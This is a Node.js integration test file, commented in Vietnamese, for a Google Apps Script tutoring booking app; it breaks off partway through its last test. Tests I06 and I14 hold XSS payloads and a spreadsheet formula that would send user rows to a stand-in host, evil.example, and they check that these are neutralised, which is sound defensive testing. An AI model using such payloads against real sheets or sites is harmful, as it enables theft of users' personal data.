/**
 * integration.js · Test tích hợp chunk 3: Setup, Migration, dropdown admin, API, chế độ Gmail thường
 *
 * Những phần này không nằm trong 40 kịch bản của file 03 nhưng quyết định việc chạy được trên Google thật:
 * cài đặt lần đầu trên file trống, trigger onEdit, xử lý lỗi API, MEET_MODE và hạn mức email.
 */
'use strict';
const assert = require('assert');
const { load } = require('./load');
const { mk, K, EMAIL } = require('./scenarios');
const { D } = require('./fixtures');

const results = [];
function t(id, title, fn) {
  try { fn(); results.push({ id, title, ok: true }); }
  catch (e) { results.push({ id, title, ok: false, err: e.message }); }
}

/** Môi trường "file Sheets trống" như khi anh vừa tạo file mới trên Google Drive. */
function freshEnv() {
  const { api, env } = load({ props: {} });
  env.state.activeUserEmail = env.state.effectiveUserEmail; // chủ script tự bấm Cài đặt lần đầu
  env.createSpreadsheet('NEW_DB', 'THAIPUT_DB_STAGING');
  env.state.activeSpreadsheetId = 'NEW_DB';
  return { api, env };
}

t('I01', 'Cài đặt lần đầu trên file trống: đủ tab, CONFIG, gói, thư mục, lịch, 8 trigger (calendarJob 5F, onChangeInstallable 5I; bỏ sundayRemind 5J)', () => {
  const { api, env } = freshEnv();
  const r = api.setupFirstRun();
  assert.ok(r.ok);
  assert.strictEqual(env.state.props.ENV, 'STAGING'); assert.strictEqual(env.state.props.DB_ID_STAGING, 'NEW_DB');
  const ss = env.state.spreadsheets.NEW_DB;
  Object.keys(api.SCHEMA).forEach(tn => assert.deepStrictEqual(ss.sheets[tn].values[0], api.SCHEMA[tn].cols, 'tab ' + tn));
  assert.strictEqual(env.state.triggers.length, 8, '5J: bỏ 2 trigger sundayRemind');
  api.clearDbCache_(); api.clearConfigCache_();
  assert.strictEqual(api.cfg_('ADMIN_EMAIL'), 'booking@thaiput.vn', 'ADMIN_EMAIL mặc định là tài khoản đang chạy');
  assert.ok(api.cfg_('LESSON_CALENDAR_ID') && api.cfg_('UPLOADS_FOLDER_ID') && api.cfg_('BACKUP_FOLDER_ID'));
  assert.deepStrictEqual(api.table_('PACKAGES').all().map(p => p.code), ['TRIAL', 'PASS_2W', 'PASS_1M'], '5L: không còn LEGACY');
  assert.ok(ss.sheets.USERS.formats['2:' + (api.SCHEMA.USERS.cols.indexOf('phone') + 1)] === '@', 'cột phone định dạng chữ sẵn');
  assert.strictEqual(api.slotList_().length, 32, 'sau cài đặt phải có 32 slot (bắt lỗi Sheets đổi 08:00 thành giờ)');
  const ts = api.testSystem();
  assert.deepStrictEqual(ts.errors, [], 'testSystem phải 0 lỗi: ' + ts.errors.join('; '));
  assert.ok(ts.warnings.some(w => /giá 0/.test(w)) && ts.warnings.some(w => /tutor/.test(w)), 'cảnh báo giá 0 và chưa có tutor');
});

t('I02', 'Chạy cài đặt lần 2 không tạo trùng, không mất dữ liệu', () => {
  const { api, env } = freshEnv();
  api.setupFirstRun();
  api.addTutor_({ name: 'Vân', email: 'van@tutor.test', phone: '0901 000 001' }, 'ADMIN');
  api.setupFirstRun();
  api.clearDbCache_();
  assert.strictEqual(env.state.triggers.length, 8, '5J: bỏ 2 trigger sundayRemind');
  const keys = api.table_('CONFIG').all().map(r => r.key);
  assert.strictEqual(keys.length, new Set(keys).size, 'không trùng khoá CONFIG');
  assert.strictEqual(api.table_('PACKAGES').all().length, 3);
  assert.strictEqual(api.table_('USERS').all().length, 1);
  assert.strictEqual(Object.values(env.state.calendars).length, 1, 'không tạo thêm lịch');
});

t('I03', 'Thêm tutor: chuẩn hoá số, chặn email trùng, tự cấp mã T001', () => {
  const { api } = freshEnv();
  api.setupFirstRun();
  const r = api.addTutor_({ name: 'Vân', email: 'Van@Tutor.test', phone: '0901 000 001', rate_vnd: 120000 }, 'ADMIN');
  assert.strictEqual(r.userId, 'T001');
  api.clearDbCache_();
  const u = api.table_('USERS').byId('T001');
  assert.strictEqual(u.email + '|' + u.phone + '|' + u.rate_vnd, 'van@tutor.test|+84901000001|120000');
  assert.strictEqual(api.addTutor_({ name: 'X', email: 'van@tutor.test', phone: '0901000002' }, 'ADMIN').ok, false);
  const yt = api.addTutor_({ name: 'Y', email: 'y@t.test', phone: 'Line: tutor_y (Thái Lan)' }, 'ADMIN');
  assert.ok(yt.ok && api.userByEmail_('y@t.test').phone === 'Line: tutor_y (Thái Lan)', '5K: số tutor không cần định dạng, lưu nguyên văn');
  assert.strictEqual(api.userByEmail_('y@t.test').contact_link, '', 'không phải số Việt Nam: không có link Zalo');
});

t('I05', 'Trigger onEdit thật: chọn "Duyệt" trên dòng REGISTRATIONS thì tạo tài khoản', () => {
  const c = mk(), { api, env } = c;
  const r = api.submitRegistration_(c.form());
  api.clearDbCache_();
  const reg = api.table_('REGISTRATIONS').byId(r.regId);
  const sheet = env.globals.SpreadsheetApp.openById('DB_STAGING_TEST').getSheetByName('REGISTRATIONS');
  const col = api.SCHEMA.REGISTRATIONS.cols.indexOf('admin_action') + 1;
  sheet.getRange(reg._row, col).setValue('Duyệt');
  const res = api.onEditInstallable({ range: sheet.getRange(reg._row, col), value: 'Duyệt', user: { getEmail: () => 'admin.karn@gmail.com' } });
  assert.ok(res.ok, res.message);
  assert.ok(c.rows('USERS').some(u => u.email === 'new1@test.com'));
  assert.strictEqual(api.onEditInstallable({ range: sheet.getRange(reg._row, 3), value: 'x' }), null, 'ô khác không xử lý');
  assert.ok(c.rows('ACTIVITY_LOG').some(l => l.action === 'REG_APPROVED' && l.actor === 'admin.karn@gmail.com'));
});

t('I06', 'doGet phục vụ đúng trang, cho phép nhúng Google Sites; apiPublicInfo không lộ bí mật', () => {
  const c = mk(), { api } = c;
  const out = api.doGet({ parameter: { page: 'login', t: 'a'.repeat(64) } });
  const bj = JSON.parse(out.template.bootJson);
  assert.deepStrictEqual([bj.page, bj.linkToken, bj.version], ['login', 'a'.repeat(64), api.APP.VERSION]);
  assert.deepStrictEqual(bj.content['h.hero_title'], ['Luyện nói tiếng Thái 1:1 với người bản xứ', '1:1 Thai speaking practice with native tutors'], 'chữ web đi kèm trang, cả hai thứ tiếng');
  assert.strictEqual(out.xfo, 'ALLOWALL'); assert.ok(out.meta.viewport);
  const html = out.getContent();
  assert.ok(html.indexOf('<?') === -1, 'không còn scriptlet chưa xử lý');
  ['T.views.home', 'T.views.login', 'T.views.student', 'T.views.tutor', '--brand'].forEach(k => assert.ok(html.indexOf(k) !== -1, 'trang thiếu ' + k));
  // Tham số URL lạ không chèn được mã vào trang
  const bad = api.doGet({ parameter: { page: '</script><script>alert(1)', t: '"><img src=x onerror=alert(1)>' } }).getContent();
  assert.ok(bad.indexOf('alert(1)') === -1, 'tham số độc bị loại');
  const b2 = JSON.parse(api.bootJson_({ page: 'Student', t: 'xyz' }));
  assert.deepStrictEqual([b2.page, b2.linkToken], ['home', '']);
  const info = api.apiPublicInfo();
  assert.ok(info.ok);
  assert.deepStrictEqual(info.data.packages.map(p => p.code), ['TRIAL', 'PASS_2W', 'PASS_1M']);
  const s = JSON.stringify(info);
  assert.ok(s.indexOf('FOLDER_') === -1 && s.indexOf('calendar.google.com') === -1 && s.indexOf('DB_') === -1, 'không lộ id thư mục, lịch, file');
});

t('I07', 'Học viên tự sửa số điện thoại, tên; gia hạn bị ép đúng email của phiên', () => {
  const c = mk(), { api } = c;
  const url = api.withLock_(() => api.createLoginLinkInLock_(api.userById_('S003')));
  const tok = api.apiExchangeToken(url.match(/t=([a-f0-9]{64})/)[1]).data.sessionToken;
  assert.ok(api.apiStudentUpdateProfile(tok, { phone: '0212 345 678' }).ok, '5K: số không định dạng vẫn lưu');
  assert.strictEqual(api.userById_('S003').phone, '0212 345 678', 'lưu nguyên văn');
  assert.ok(api.apiStudentUpdateProfile(tok, { phone: '0988 777 666', name: 'Ba Mới' }).ok);
  const u = c.row('USERS', 'S003');
  assert.strictEqual(u.phone + '|' + u.name, '+84988777666|Ba Mới');
  const shot = { name: 'a.png', mimeType: 'image/png', base64: Buffer.from('x').toString('base64') };
  const r = api.apiStudentRenew(tok, { email: 'nguoikhac@test.com', package_code: 'PASS_2W', screenshot: shot });
  assert.ok(r.ok);
  const reg = c.row('REGISTRATIONS', r.data.regId);
  assert.strictEqual(reg.email + '|' + reg.kind, EMAIL.S003 + '|RENEW');
  assert.strictEqual(reg.transfer_code, 'TP S003 2W', 'mã chuyển khoản dùng mã học viên (dữ liệu mẫu đặt mã S003)');
});

t('I08', 'Lỗi bất ngờ trong API: trang web nhận câu chung, admin nhận email chi tiết', () => {
  const c = mk(), { api, env } = c;
  env.state.spreadsheets.DB_STAGING_TEST.sheets.PACKAGES.values[0][0] = 'ma_goi';
  const r = api.apiPublicInfo();
  assert.strictEqual(r.reason, 'SERVER_ERROR');
  assert.ok(r.message.indexOf('admin đã được báo') !== -1);
  assert.ok(c.mailsTo(EMAIL.ADMIN).some(m => m.subject.indexOf('[Lỗi hệ thống] API apiPublicInfo') === 0));
});

t('I09', 'MEET_MODE = TUTOR_ROOM: dùng phòng cố định của tutor, không tạo Meet mới', () => {
  const c = mk(), { api, env } = c;
  const cfg = api.table_('CONFIG'); cfg.insert({ key: 'MEET_MODE', value: 'TUTOR_ROOM' });
  const users = api.table_('USERS');
  ['T001', 'T002', 'T003', 'T004'].forEach(id => users.update(users.byId(id), { meet_room: 'https://meet.google.com/room-' + id }));
  api.clearConfigCache_();
  c.onlyOpen(K(14, 10), '19:00', ['T003']);
  const r = c.book('S003', [[K(14, 10), '19:00']]);
  assert.strictEqual(r[0].meetLink, 'https://meet.google.com/room-T003');
  const ins = env.state.calendarCalls.filter(x => x.op === 'insert').pop();
  assert.ok(!ins.res.conferenceData && ins.res.location === 'https://meet.google.com/room-T003');
});

t('I10', 'Gần hết hạn mức email (Gmail thường): bỏ email nhắc, vẫn gửi email quan trọng', () => {
  const c = mk(), { api, env } = c;
  const r = c.book('S003', [[K(14, 10), '19:00']]);
  env.globals.MailApp.getRemainingDailyQuota = () => 10;
  c.at('2026-10-14 18:00'); api.reminderJob();
  assert.ok(!env.state.mails.some(m => /^Nhắc: buổi học|^Reminder: lesson/.test(m.subject)), 'không gửi email nhắc');
  assert.ok(c.rows('ACTIVITY_LOG').some(l => l.action === 'MAIL_SKIPPED_LOW_QUOTA'));
  assert.ok(!c.row('BOOKINGS', r[0].bookingId).reminder_sent_at, 'chưa đánh dấu đã nhắc');
  c.at('2026-10-13 10:00');
  assert.ok(api.cancelBookingFor_('S003', r[0].bookingId, EMAIL.S003).ok);
  assert.ok(c.mailsTo(EMAIL.S003).some(m => m.subject.indexOf('Huỷ buổi') === 0), 'email huỷ vẫn gửi');
});

t('I11', 'Tạm khoá vẫn đăng nhập xem lịch được; tài khoản DISABLED không đăng nhập được', () => {
  const c = mk(), { api } = c;
  api.suspendStudent_('S005', 'ADMIN');
  assert.ok(api.requestLoginLink_(EMAIL.S005).ok);
  assert.ok(c.mailsTo(EMAIL.S005).length === 1);
  const users = api.table_('USERS'); users.update(users.byId('S006'), { status: 'DISABLED' });
  api.requestLoginLink_(EMAIL.S006);
  assert.strictEqual(c.mailsTo(EMAIL.S006).length, 0);
});

// ═══ Chunk 5: các lỗi do lượt soát độc lập tìm ra ═══

t('I12', 'Người lạ trên web không chạy được hàm vận hành (menu, job, cài đặt) qua google.script.run; trigger thật thì chạy', () => {
  const c = mk(), { api, env } = c;
  api.createTriggers_({});
  const before = env.state.triggers.length, props = JSON.stringify(env.state.props);
  env.state.activeUserEmail = ''; // khách ẩn danh của web app "Anyone"
  // Mọi hàm google.script.run gọi được: không có dấu _ ở cuối. Hàm api* tự kiểm tra phiên; doGet, onOpen vô hại.
  const exposed = Object.keys(api).filter(n => typeof api[n] === 'function' && !/_$/.test(n) && !/^api/.test(n) && ['doGet', 'doPost', 'onOpen'].indexOf(n) === -1);
  assert.ok(exposed.length >= 20, 'tìm thấy ' + exposed.length + ' hàm');
  exposed.forEach(n => {
    let threw = '';
    try { api[n]({ triggerUid: 'doan-bua' }); } catch (e) { threw = e.message; }
    assert.ok(/Không có quyền/.test(threw), n + ' phải bị chặn, nhận: ' + (threw || 'chạy được'));
  });
  assert.strictEqual(env.state.triggers.length, before, 'không xoá trigger');
  assert.strictEqual(JSON.stringify(env.state.props), props, 'không đổi ENV');
  // Trigger thật của project (e.triggerUid khớp) vẫn chạy khi không có người dùng
  const rt = env.state.triggers.find(x => x.fn === 'reminderJob');
  assert.strictEqual(typeof api.reminderJob({ triggerUid: rt.getUniqueId() }), 'number');
  // Người đăng nhập Google nhưng không phải admin (ví dụ học viên được chia sẻ nhầm file) cũng bị chặn
  env.state.activeUserEmail = 's003@student.test';
  assert.throws(() => api.menuCreateTriggers(), /Không có quyền/);
  // Admin bấm menu trong Sheets vẫn chạy job, nhưng không tạo được bộ trigger thứ hai (chỉ chủ file)
  env.state.activeUserEmail = 'admin.karn@gmail.com';
  assert.strictEqual(typeof api.reminderJob(), 'number');
  env.state.activeSpreadsheetId = 'DB_STAGING_TEST';
  assert.throws(() => api.menuCreateTriggers(), /Chỉ chủ file/);
  assert.throws(() => api.setupFirstRun(), /Chỉ chủ file/);
});

t('I13', 'Tab tự thêm hàng khi vượt 1.000 hàng (Google không tự thêm khi ghi bằng getRange)', () => {
  const { api, env } = freshEnv();
  api.setupFirstRun();
  api.clearDbCache_();
  api.withLock_(() => { for (let i = 0; i < 1200; i++) api.logActivity_('TEST', 'FILL', 'X', String(i), ''); });
  const sh = env.state.spreadsheets.NEW_DB.sheets.ACTIVITY_LOG;
  assert.ok(sh.maxRows >= 1201, 'số hàng tab: ' + sh.maxRows);
  api.clearDbCache_();
  assert.strictEqual(api.table_('ACTIVITY_LOG').all().filter(r => r.action === 'FILL').length, 1200);
});

t('I14', 'Chữ người dùng bắt đầu bằng = + - @ không thành công thức trong Sheets', () => {
  const c = mk(), { api, env } = c;
  const evil = '=IMAGE("https://evil.example/?"&TEXTJOIN(",",1,USERS!C2:E500))';
  const r = api.submitRegistration_(c.form({ name: evil, level_self: '+SUM(1)', email: 'x@test.com' }));
  assert.ok(r.ok, String(r.reasons));
  api.approveRegistration_(r.regId, 'admin@thaiput.vn');
  const u = c.rows('USERS').find(x => x.email === 'x@test.com');
  assert.strictEqual(u.name, evil, 'tên lưu nguyên văn');
  const bad = env.state.formulaWrites.filter(w => !/^=HYPERLINK\("https:\/\/zalo\.me\//.test(w.value));
  assert.deepStrictEqual(bad, [], 'chỉ có công thức HYPERLINK do code tạo');
  // Lớp bảo vệ thứ hai: cột không phải dạng chữ cũng ghi nguyên văn
  api.withLock_(() => api.logActivity_('TEST', 'X', 'E', '=1+1', ''));
  assert.strictEqual(env.state.formulaWrites.filter(w => w.value === '=1+1').length, 0);
  assert.ok(c.rows('ACTIVITY_LOG').some(l => l.entity_id === '=1+1'));
});

t('I15', 'Gửi email lỗi sau khi đã ghi: đặt lịch vẫn báo thành công; email lỗi trùng chỉ gửi admin 1 lần mỗi giờ', () => {
  const c = mk(), { api, env } = c;
  const url = api.withLock_(() => api.createLoginLinkInLock_(api.userById_('S003')));
  const tok = api.apiExchangeToken(url.match(/t=([a-f0-9]{64})/)[1]).data.sessionToken;
  const realSend = env.globals.GmailApp.sendEmail;
  env.globals.GmailApp.sendEmail = () => { throw new Error('Service invoked too many times for one day: email.'); };
  const res = api.apiStudentBook(tok, [{ date: K(14, 10), slot: '19:00' }]);
  assert.ok(res.ok && res.data[0].ok, JSON.stringify(res));
  assert.strictEqual(c.rows('BOOKINGS').length, 1);
  assert.ok(c.rows('ACTIVITY_LOG').some(l => l.action === 'MAIL_FAILED'));
  env.globals.GmailApp.sendEmail = realSend;
  const n0 = env.state.mails.length;
  api.mailAdminError_('Job x lỗi', 'a'); api.mailAdminError_('Job x lỗi', 'b'); api.mailAdminError_('Job y lỗi', 'c');
  assert.strictEqual(env.state.mails.length - n0, 2, 'x 1 lần, y 1 lần');
});

t('I16', 'Tutor lưu 192 slot một lần: ghi theo lô, không giữ khoá cả phút', () => {
  const c = mk(), { api, env } = c;
  const changes = [];
  for (let d = 19; d <= 24; d++) api.slotList_().forEach(s => changes.push({ date: K(d, 10), slot: s, open: true }));
  assert.strictEqual(changes.length, 192);
  env.state.writeCalls = 0;
  const out = api.setAvailabilityFor_('T001', changes, EMAIL.T001);
  assert.ok(out.every(x => x.ok && x.state === 'OPEN'));
  assert.ok(env.state.writeCalls <= 12, 'số lần ghi Sheets: ' + env.state.writeCalls);
  assert.strictEqual(c.rows('AVAILABILITY').filter(a => a.tutor_id === 'T001' && c.keyOf(a.date) >= K(19, 10)).length, 192);
  assert.ok(c.rows('AVAILABILITY').every(a => /^\d{2}:\d{2}$/.test(a.slot)), 'slot vẫn là chữ 19:00');
});

t('I17', 'Chống spam đăng ký, chặn đặt quá xa, hệ thống bận không email admin', () => {
  const c = mk(), { api, env } = c;
  for (let i = 0; i < 20; i++) assert.ok(api.apiSubmitRegistration(c.form({ email: 'spam' + i + '@test.com', package_code: 'PASS_1M' })).ok, 'đăng ký ' + i);
  const r21 = api.apiSubmitRegistration(c.form({ email: 'spam21@test.com' }));
  assert.strictEqual(r21.reason, 'RATE_LIMITED');
  const hp = mk();
  assert.strictEqual(hp.api.apiSubmitRegistration(hp.form({ website: 'http://spam' })).ok, false);
  assert.strictEqual(hp.rows('REGISTRATIONS').length, 0, 'ô ẩn bị điền: không ghi');
  assert.strictEqual(hp.api.apiSubmitRegistration(hp.form({ name: 'A'.repeat(81) })).ok, false, 'tên quá 80 ký tự');
  assert.deepStrictEqual(c.reasons(c.book('S003', [['2026-11-20', '19:00']])), ['TOO_FAR']);
  assert.strictEqual(api.setAvailabilityFor_('T001', [{ date: '2026-12-01', slot: '19:00', open: true }], EMAIL.T001)[0].reason, 'TOO_FAR');
  const url = api.withLock_(() => api.createLoginLinkInLock_(api.userById_('S003')));
  const tok = api.apiExchangeToken(url.match(/t=([a-f0-9]{64})/)[1]).data.sessionToken;
  const n0 = env.state.mails.length;
  env.state.lockBusy = true;
  const busy = api.apiStudentBook(tok, [{ date: K(14, 10), slot: '19:00' }]);
  assert.strictEqual(busy.reason, 'BUSY');
  assert.strictEqual(api.reminderJob(), null, 'job bỏ lượt khi bận');
  assert.strictEqual(env.state.mails.length, n0, 'không email admin khi chỉ bận');
  env.state.lockBusy = false;
});

t('I18', 'WEBAPP_URL: không ghi link /dev; testSystem báo lỗi khi thiếu link /exec', () => {
  const { api, env } = freshEnv();
  env.state.serviceUrl = 'https://script.google.com/macros/s/ABC/dev';
  api.setupFirstRun();
  api.clearDbCache_(); api.clearConfigCache_();
  assert.strictEqual(api.cfg_('WEBAPP_URL'), '');
  assert.ok(api.testSystem().errors.some(e => /WEBAPP_URL/.test(e)));
});

t('I19', 'Bản dán tay dist/ (một Code.gs, HTML tên ngắn) chạy được: cài đặt, kiểm tra, trang web', () => {
  const fs = require('fs'), path = require('path');
  const dist = path.join(__dirname, '..', 'dist');
  require('child_process').execFileSync(process.execPath, [path.join(__dirname, 'build_dist.js')]);
  const { api, env } = load({ props: {}, source: fs.readFileSync(path.join(dist, 'Code.gs'), 'utf8'), srcDir: dist });
  env.state.activeUserEmail = env.state.effectiveUserEmail;
  env.createSpreadsheet('NEW_DB', 'THAIPUT_DB_STAGING');
  env.state.activeSpreadsheetId = 'NEW_DB';
  assert.ok(api.setupFirstRun().ok);
  api.clearDbCache_(); api.clearConfigCache_();
  assert.deepStrictEqual(api.testSystem().errors, []);
  const html = api.doGet({ parameter: { page: 'home' } }).getContent();
  ['T.views.home', 'T.views.tutor', '--brand'].forEach(k => assert.ok(html.indexOf(k) !== -1, 'thiếu ' + k));
  assert.ok(html.indexOf('<?') === -1);
  assert.deepStrictEqual(fs.readdirSync(dist).sort(), ['Code.gs', 'Index.html', 'appsscript.json'], 'bản dán tay chỉ 3 file');
  // Bản nhiều file mà thiếu Styles: báo lỗi chỉ rõ cách sửa
  const { api: api2 } = load({ props: {}, source: fs.readFileSync(path.join(dist, 'Code.gs'), 'utf8'), srcDir: path.join(__dirname, 'no_such_dir') });
  assert.throws(() => api2.include_('ui/Styles'), /Thiếu file HTML "Styles".*Phiên bản mới/);
});

t('I20', 'Chuyển tài khoản: Bước A gỡ sự kiện (buổi giữ nguyên), Bước B tạo lại sự kiện và link Meet mới', () => {
  const c = mk(), { api } = c;
  c.book('S003', [[K(14, 10), '19:00'], [K(16, 10), '20:00']]);
  const a = api.detachFutureEvents_('admin@thaiput.vn');
  assert.strictEqual(a.removed, 2);
  assert.strictEqual(c.calls('remove').length, 2);
  assert.ok(c.rows('BOOKINGS').every(b => b.status === 'CONFIRMED' && !b.event_id && !b.meet_link));
  const b = api.recreateFutureEvents_('admin@thaiput.vn');
  assert.deepStrictEqual([b.created, b.failed.length], [2, 0]);
  assert.ok(c.rows('BOOKINGS').every(x => x.event_id && /meet\.google\.com/.test(x.meet_link)));
  assert.strictEqual(api.recreateFutureEvents_('admin@thaiput.vn').created, 0, 'chạy lại không tạo trùng');
});

t('I21', 'Dòng BOOKINGS đã nằm trong Sheets trước khi gửi thư mời Calendar (lần chạy bị dừng đột ngột không để lại thư mời mồ côi)', () => {
  const c = mk(), { api, env } = c;
  const sheet = env.state.spreadsheets.DB_STAGING_TEST.sheets.BOOKINGS;
  const real = env.globals.Calendar.Events.insert, seen = [];
  env.globals.Calendar.Events.insert = (res, cal, opt) => { seen.push(sheet.values.length - 1); return real(res, cal, opt); };
  c.book('S003', [[K(14, 10), '19:00'], [K(15, 10), '19:00']]);
  env.globals.Calendar.Events.insert = real;
  // Từ 5B: ghi xong cả lô BOOKINGS (trong khoá) rồi mới gọi Calendar (ngoài khoá).
  assert.deepStrictEqual(seen, [2, 2], 'số dòng BOOKINGS trong Sheets lúc gọi Calendar');
});

t('I22', 'Thứ Bảy 10/10 20:47: mặc định không đặt được 10/10, 11/10 (luật 15:00); bật BOOKING_LEAD_HOURS = 2 thì đặt được', () => {
  const c = mk('2026-10-10 20:47'), { api } = c;
  [['2026-10-10', '23:00'], ['2026-10-10', '23:30'], ['2026-10-11', '19:00'], ['2026-10-10', '21:30']].forEach(x => c.setSlot('T001', x[0], x[1], 'OPEN'));
  const url = api.withLock_(() => api.createLoginLinkInLock_(api.userById_('S003')));
  const tok = api.apiExchangeToken(url.match(/t=([a-f0-9]{64})/)[1]).data.sessionToken;
  const days = () => { api.clearDbCache_(); return api.apiStudentSlots(tok).data.map(d => d.date + ' ' + d.slots.join(',')); };
  assert.ok(!days().some(d => /^2026-10-1[01]/.test(d)), 'mặc định: chỉ từ 12/10');
  assert.deepStrictEqual(c.reasons(c.book('S003', [['2026-10-11', '19:00']])), ['DEADLINE']);
  api.withLock_(() => api.table_('CONFIG').insert({ key: 'BOOKING_LEAD_HOURS', value: '2' }));
  api.clearConfigCache_();
  const d2 = days();
  assert.ok(d2.indexOf('2026-10-10 23:00,23:30') !== -1, 'hôm nay còn 23:00, 23:30 (21:30 đã quá hạn 2 tiếng): ' + d2.join(' | '));
  assert.ok(d2.some(d => d.indexOf('2026-10-11') === 0 && d.indexOf('19:00') !== -1));
  assert.deepStrictEqual(c.reasons(c.book('S003', [['2026-10-10', '21:30']])), ['DEADLINE'], 'sát giờ hơn 2 tiếng vẫn chặn');
  assert.deepStrictEqual(c.reasons(c.book('S003', [['2026-10-10', '23:30'], ['2026-10-11', '19:00']])), ['OK', 'OK']);
  const home = api.apiStudentHome(tok).data;
  assert.strictEqual(home.rules.bookingLeadHours, 2);
  assert.ok(home.upcoming.every(l => l.canCancel === false), 'đặt sau 15:00 hôm trước: không huỷ được, buổi vẫn tính');
});

t('I23', 'Chế độ test BOOK_UNTIL_START = TRUE (admin tự thêm vào CONFIG): 20:47 đặt được slot 21:00 tối nay, slot đã bắt đầu thì không', () => {
  const c = mk('2026-10-10 20:47'), { api } = c;
  [['2026-10-10', '20:30'], ['2026-10-10', '21:00'], ['2026-10-11', '08:00']].forEach(x => c.setSlot('T001', x[0], x[1], 'OPEN'));
  api.withLock_(() => api.table_('CONFIG').insert({ key: 'BOOK_UNTIL_START', value: 'TRUE' }));
  api.clearConfigCache_();
  const url = api.withLock_(() => api.createLoginLinkInLock_(api.userById_('S003')));
  const tok = api.apiExchangeToken(url.match(/t=([a-f0-9]{64})/)[1]).data.sessionToken;
  const today = api.apiStudentSlots(tok).data.find(d => d.date === '2026-10-10');
  assert.ok(today && today.slots.indexOf('21:00') !== -1 && today.slots.indexOf('20:30') === -1, JSON.stringify(today));
  assert.deepStrictEqual(c.reasons(c.book('S003', [['2026-10-10', '20:30'], ['2026-10-10', '21:00'], ['2026-10-11', '08:00']])), ['DEADLINE', 'ONE_PER_DAY', 'OK']);
  assert.deepStrictEqual(c.reasons(c.book('S002', [['2026-10-10', '20:30']])), ['DEADLINE'], 'slot đã bắt đầu');
  assert.deepStrictEqual(c.reasons(c.book('S002', [['2026-10-10', '21:00']])), ['OK']);
  assert.strictEqual(api.apiStudentHome(tok).data.rules.bookingLeadHours, 0);
  api.withLock_(() => api.table_('CONFIG').update(api.table_('CONFIG').byId('BOOK_UNTIL_START'), { value: 'FALSE' }));
  api.clearConfigCache_();
  assert.ok(!api.apiStudentSlots(tok).data.some(d => d.date === '2026-10-10'), 'tắt thì về luật 15:00 hôm trước');
});

// ═══ Chunk 5A ═══

t('I24', 'Một địa chỉ admin nhận email (ADMIN_EMAIL); admin trong USERS có quyền nhưng không nhận email; admin dự phòng DISABLED không có quyền', () => {
  const c = mk(), { api, env } = c;
  assert.ok(api.addAdmin_({ name: 'Dự phòng', email: 'Backup.Admin@Gmail.com' }, 'admin@thaiput.vn').ok);
  assert.strictEqual(api.addAdmin_({ name: 'Trùng', email: 'backup.admin@gmail.com' }, 'x').ok, false, 'email trùng');
  assert.deepStrictEqual(api.adminEmails_(), ['admin@thaiput.vn'], 'chỉ ADMIN_EMAIL nhận email');
  const r = api.submitRegistration_(c.form());
  assert.ok(r.ok);
  const m = env.state.mails.find(x => x.subject.indexOf('[Đăng ký mới]') === 0);
  assert.strictEqual(m.to, 'admin@thaiput.vn', 'đúng 1 người nhận: ' + m.to);
  // Admin dự phòng: đặt DISABLED thì không chạy được menu; bật ACTIVE khi cần thì chạy được
  const bk = c.rows('USERS').find(u => u.email === 'backup.admin@gmail.com');
  api.withLock_(() => api.table_('USERS').update(api.table_('USERS').byId(bk.user_id), { status: 'DISABLED' }));
  env.state.activeUserEmail = 'backup.admin@gmail.com';
  assert.throws(() => api.reminderJob(), /Không có quyền/);
  api.withLock_(() => api.table_('USERS').update(api.table_('USERS').byId(bk.user_id), { status: 'ACTIVE' }));
  assert.strictEqual(typeof api.reminderJob(), 'number');
});

t('I25', 'Slot đã duyệt huỷ khi có học viên thành BLOCKED: tutor không tự mở lại, không ai đặt được, không là tutor thay', () => {
  const c = mk(), { api } = c;
  c.onlyOpen(K(14, 10), '19:00', ['T001']);
  const bk = c.book('S003', [[K(14, 10), '19:00']])[0].bookingId;
  c.setSlot('T002', K(14, 10), '19:00', 'OPEN');
  c.at('2026-10-13 09:00');
  api.setAvailabilityFor_('T001', [{ date: K(14, 10), slot: '19:00', open: false }], EMAIL.T001);
  const av = c.rows('AVAILABILITY').find(a => a.tutor_id === 'T001' && c.keyOf(a.date) === K(14, 10) && a.slot === '19:00');
  assert.strictEqual(api.decideTutorCancel_(av.avail_id, 'Duyệt', 'admin@thaiput.vn').outcome, 'REASSIGNED');
  assert.strictEqual(c.row('AVAILABILITY', av.avail_id).status, 'BLOCKED');
  assert.strictEqual(c.row('BOOKINGS', bk).tutor_id, 'T002');
  const re = api.setAvailabilityFor_('T001', [{ date: K(14, 10), slot: '19:00', open: true }], EMAIL.T001);
  assert.strictEqual(re[0].reason, 'SLOT_BLOCKED', 'tutor không tự mở lại');
  ['T002', 'T003', 'T004'].forEach(t => c.setSlot(t, K(14, 10), '19:00', 'CANCELLED')); // chỉ còn slot BLOCKED của T001
  assert.deepStrictEqual(c.reasons(c.book('S005', [[K(14, 10), '19:00']])), ['NO_TUTOR'], 'không ai đặt được slot BLOCKED');
  const items = api.availabilityFor_('T001', K(12, 10), 7).filter(x => x.date === K(14, 10) && x.slot === '19:00');
  assert.strictEqual(items[0].status, 'BLOCKED', 'cổng tutor thấy slot bị khoá');
});

t('I26', 'Gửi link đăng nhập hàng loạt: đúng người, bỏ qua mã sai, tài khoản khoá và admin', () => {
  const c = mk(), { api, env } = c;
  api.withLock_(() => api.table_('USERS').update(api.userById_('S002'), { status: 'DISABLED' }));
  const n0 = env.state.mails.length;
  const r = api.sendLoginLinks_(['S001', 'T002', 'S002', 'A01', 'S9999', 'S003'], 'admin@thaiput.vn');
  assert.deepStrictEqual(r.sent, ['S001', 'T002', 'S003']);
  assert.deepStrictEqual(r.skipped, ['S002', 'A01', 'S9999']);
  assert.strictEqual(env.state.mails.length - n0, 3);
  assert.ok(c.mailsTo(EMAIL.T002).some(m => m.subject.indexOf('Your thaiput login link') === 0));
});

t('I27', '5J: xin link lần 2 trong 60 phút báo giờ đã gửi, giờ xin lại (không còn 3 lần mỗi 5 phút); email không còn số điện thoại admin', () => {
  const c = mk('2026-10-12 10:20'), { api, env } = c;
  const res = [1, 2].map(() => api.apiRequestLogin(EMAIL.S003));
  assert.strictEqual(res[1].reason, 'LINK_COOLDOWN');
  assert.ok(res[1].message.indexOf('Nếu email có trong hệ thống, link đã được gửi lúc 10:20. Kiểm cả mục Spam. Xin link mới được sau 11:20.') === 0, res[1].message);
  const html = env.state.mails.map(m => m.htmlBody).join('');
  assert.ok(html.indexOf('tel:') === -1 && html.indexOf('Gọi ') === -1, 'không còn nút gọi điện trong email');
  assert.ok(html.indexOf('zalo.me') !== -1, 'vẫn có Zalo');
  const u = api.addTutor_({ name: 'Somchai', email: 'somchai@tutor.test', phone: '+66 81 234 5678' }, 'admin');
  assert.ok(u.ok);
